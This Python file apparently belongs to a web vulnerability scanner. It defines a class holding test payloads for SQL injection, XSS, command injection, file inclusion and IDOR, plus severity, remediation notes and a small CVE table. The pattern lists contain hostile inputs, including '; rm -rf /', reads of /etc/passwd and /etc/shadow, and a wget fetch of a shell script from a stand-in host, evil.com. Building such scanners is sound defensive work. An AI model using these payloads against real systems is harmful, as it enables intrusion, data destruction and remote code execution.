
import json
import os
from typing import Dict, List, Any

class VulnerabilityDatabase:
    """Database for storing and managing vulnerability information"""
    
    def __init__(self):
        self.vulnerabilities = {}
        self.cve_database = {}
        self.load_default_vulnerabilities()
    
    def load_default_vulnerabilities(self):
        """Load default vulnerability patterns and signatures"""
        self.vulnerabilities = {
            'sql_injection': {
                'patterns': [
                    "' OR '1'='1",
                    "' UNION SELECT",
                    "'; DROP TABLE",
                    "' OR 1=1--",
                    "admin'--",
                    "' OR 'a'='a",
                    "1' AND 1=1",
                    "' WAITFOR DELAY"
                ],
                'severity': 'Critical',
                'description': 'SQL Injection vulnerability allows attackers to manipulate database queries',
                'remediation': 'Use parameterized queries and input validation'
            },
            'xss': {
                'patterns': [
                    "<script>alert('XSS')</script>",
                    "<img src=x onerror=alert(1)>",
                    "javascript:alert('XSS')",
                    "<svg onload=alert(1)>",
                    "';alert(String.fromCharCode(88,83,83))//",
                    "<iframe src=javascript:alert(1)>",
                    "<body onload=alert(1)>"
                ],
                'severity': 'High',
                'description': 'Cross-Site Scripting vulnerability allows execution of malicious scripts',
                'remediation': 'Implement proper output encoding and Content Security Policy'
            },
            'command_injection': {
                'patterns': [
                    "; cat /etc/passwd",
                    "&& whoami",
                    "| ls -la",
                    "; rm -rf /",
                    "&& ping -c 4 127.0.0.1",
                    "; wget http://evil.com/shell.sh"
                ],
                'severity': 'Critical',
                'description': 'Command injection allows execution of arbitrary system commands',
                'remediation': 'Avoid system calls with user input and use safe APIs'
            },
            'lfi': {
                'patterns': [
                    "../../../etc/passwd",
                    "..\\..\\..\\windows\\system32\\drivers\\etc\\hosts",
                    "/etc/shadow",
                    "file://",
                    "php://filter/"
                ],
                'severity': 'High',
                'description': 'Local File Inclusion allows reading arbitrary files from the server',
                'remediation': 'Validate file paths and use allowlists for file access'
            },
            'idor': {
                'patterns': [
                    "id=1",
                    "user_id=",
                    "account=",
                    "profile_id=",
                    "document_id="
                ],
                'severity': 'Medium',
                'description': 'Insecure Direct Object Reference allows unauthorized access to objects',
                'remediation': 'Implement proper access controls and authorization checks'
            }
        }
        
        # Load CVE database
        self.cve_database = {
            'apache': {
                'CVE-2021-41773': {
                    'description': 'Apache HTTP Server path traversal vulnerability',
                    'severity': 'Critical',
                    'versions_affected': ['2.4.49', '2.4.50']
                }
            },
            'nginx': {
                'CVE-2013-2028': {
                    'description': 'Nginx stack-based buffer overflow',
                    'severity': 'High',
                    'versions_affected': ['1.3.9-1.4.0']
                }
            },
            'php': {
                'CVE-2019-11043': {
                    'description': 'PHP-FPM remote code execution vulnerability',
                    'severity': 'Critical',
                    'versions_affected': ['7.1.x', '7.2.x', '7.3.x']
                }
            }
        }
    
    def get_vulnerability_patterns(self, vuln_type: str) -> List[str]:
        """Get vulnerability patterns for a specific type"""
        if vuln_type in self.vulnerabilities:
            return self.vulnerabilities[vuln_type]['patterns']
        return []
    
    def get_vulnerability_info(self, vuln_type: str) -> Dict[str, Any]:
        """Get detailed information about a vulnerability type"""
        return self.vulnerabilities.get(vuln_type, {})
    
    def search_cve(self, technology: str, version: str = None) -> List[Dict[str, Any]]:
        """Search for CVEs related to a specific technology"""
        results = []
        if technology.lower() in self.cve_database:
            for cve_id, cve_info in self.cve_database[technology.lower()].items():
                if not version or version in cve_info.get('versions_affected', []):
                    results.append({
                        'cve_id': cve_id,
                        'description': cve_info['description'],
                        'severity': cve_info['severity'],
                        'versions_affected': cve_info.get('versions_affected', [])
                    })
        return results
    
    def add_custom_vulnerability(self, vuln_type: str, patterns: List[str], 
                                severity: str, description: str, remediation: str):
        """Add a custom vulnerability type to the database"""
        self.vulnerabilities[vuln_type] = {
            'patterns': patterns,
            'severity': severity,
            'description': description,
            'remediation': remediation
        }
    
    def get_all_vulnerability_types(self) -> List[str]:
        """Get all available vulnerability types"""
        return list(self.vulnerabilities.keys())
    
    def export_database(self, filename: str):
        """Export the vulnerability database to a JSON file"""
        data = {
            'vulnerabilities': self.vulnerabilities,
            'cve_database': self.cve_database
        }
        with open(filename, 'w') as f:
            json.dump(data, f, indent=2)
    
    def import_database(self, filename: str):
        """Import vulnerability database from a JSON file"""
        if os.path.exists(filename):
            with open(filename, 'r') as f:
                data = json.load(f)
                self.vulnerabilities.update(data.get('vulnerabilities', {}))
                self.cve_database.update(data.get('cve_database', {}))
    
    def get_severity_color(self, severity: str) -> str:
        """Get color code for severity level"""
        severity_colors = {
            'Critical': '#dc3545',
            'High': '#fd7e14', 
            'Medium': '#ffc107',
            'Low': '#28a745',
            'Info': '#17a2b8'
        }
        return severity_colors.get(severity, '#6c757d')
